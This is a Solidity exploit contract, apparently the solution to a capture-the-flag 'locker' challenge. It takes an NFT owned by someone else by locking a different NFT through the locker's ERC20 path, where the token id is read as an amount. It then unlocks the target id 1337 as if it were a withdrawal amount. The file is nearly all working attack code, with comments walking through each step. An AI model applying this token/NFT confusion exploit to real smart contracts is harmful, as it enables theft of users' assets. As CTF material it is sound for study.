// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Setup} from "src/locker/Setup.sol";
import {console2} from "lib/forge-std/src/console2.sol";

contract Exploit {
    Setup setup;

    constructor(Setup _setup) {
        setup = _setup;
    }

    function solve() external {
        // Claim 500e18 GREY
        setup.claim();
        // Exploit: 500e18 GREY

        // Mint NFT id 1338 using 100e18 GREY
        setup.grey().approve(address(setup.greyNFT()), 100e18);
        setup.greyNFT().mintNFT(1338);
        // Exploit: 400e18 GREY

        // Lock NFT id 1338 in Locker (but as a token instead of an NFT)
        setup.greyNFT().approve(address(setup.locker()), 1338);
        uint256 lockId = setup.locker().lockToken(
            address(setup.greyNFT()),
            1338,
            0,
            address(this)
        );
        // Exploit: 400e18 GREY

        // The locker contract thinks we have 1338 as the amount of the token,
        // so it will allow us to withdraw an amount of 1337 token
        // but it is actually an NFT with id 1337
        setup.locker().unlockToken(
            lockId,
            1337
        );

        // Assert that the exploit contract now owns NFT id 1337
        require(
            setup.greyNFT().ownerOf(1337) == address(this),
            "Exploit contract does not own NFT id 1337"
        );

        // Transfer NFT id 1337 to msg.sender
        setup.greyNFT().transferFrom(
            address(this),
            msg.sender,
            1337
        );
    }
}
